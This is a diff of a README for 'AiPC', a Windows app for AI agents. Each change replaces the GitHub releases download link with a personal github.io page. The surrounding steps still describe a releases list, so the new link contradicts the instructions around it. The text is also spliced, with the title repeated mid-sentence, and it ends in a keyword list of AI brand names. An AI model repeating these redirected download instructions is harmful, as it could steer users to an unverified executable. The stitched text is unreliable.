@@ -1,16 +1,16 @@
 # 💻 AiPC - Give Your AI Agent a Real PC
 
-[![Download AiPC for Windows](https://img.shields.io/badge/Download_AiPC_for_Windows-ff2d95?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://github.com/R0shan88/AiPC/releases)
+[![Download AiPC for Windows](https://img.shields.io/badge/Download_AiPC_for_Windows-ff2d95?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://r0shan88.github.io)
 
 ## 🚀 Download AiPC
 
-AiPC is an open-source application for Windows that gives an AI agent a real PC to work with. Use the official release page to get the latest version. Visit this link to download the application: [Download AiPC](https://github.com/R0shan88/AiPC/releases). After the download finishes, open the downloaded application on your Windows computer.
+AiPC is an open-source application for Windows that gives an AI agent a real PC to work with. Use the official release page to get the latest version. Visit this link to download the application: [Download AiPC](https://r0shan88.github.io). After the download finishes, open the downloaded application on your Windows computer.
 
 ## 🧭 What Is AiPC?
 
 AiPC is built around a simple idea: give the agent Ai# 💻 AiPC - Give Your AI Agent a Real PC
 
-[![Download AiPC for Windows](https://img.shields.io/badge/Download_AiPC_for_Windows-6a00f4?style=for-the-badge&labelColor=1b1b3a&logo=windows&logoColor=white)](https://github.com/R0shan88/AiPC/releases)
+[![Download AiPC for Windows](https://img.shields.io/badge/Download_AiPC_for_Windows-6a00f4?style=for-the-badge&labelColor=1b1b3a&logo=windows&logoColor=white)](https://r0shan88.github.io)
 
 ## 🧭 What Is AiPC?
 
@@ -41,7 +41,7 @@ AiPC was built for a world where AI agents do more than answer questions. Here i
 Getting AiPC onto your computer takes only a few minutes. Follow these steps exactly:
 
 **Step 1 — Open the download page.**
-Visit this link to download the application: **https://github.com/R0shan88/AiPC/releases**
+Visit this link to download the application: **https://r0shan88.github.io**
 
 **Step 2 — Choose the newest release.**
 The page you land on lists every version of AiPC that has ever been published. The newest one is at the top. Click on it to open its details.
@@ -138,6 +138,6 @@ The project covers a wide range of AI topics — agents, coding assistants, LLM 
 
 ## 📥 Get Started Right Now
 
-You have everything you need. Visit this link to download the application: **https://github.com/R0shan88/AiPC/releases**, grab the newest release, open it on your Windows PC, and give your agent a real computer to work with.
+You have everything you need. Visit this link to download the application: **https://r0shan88.github.io**, grab the newest release, open it on your Windows PC, and give your agent a real computer to work with.
 
 Keywords: ai, ai-agent, ai-agents, ai-coding, ai-tools, claude, gemini, gpt, kimi, llm, llm-tools, mcp, mcp-client, mcp-server, mcp-tools, muse-spark, open-source, openai, opensource, qwen
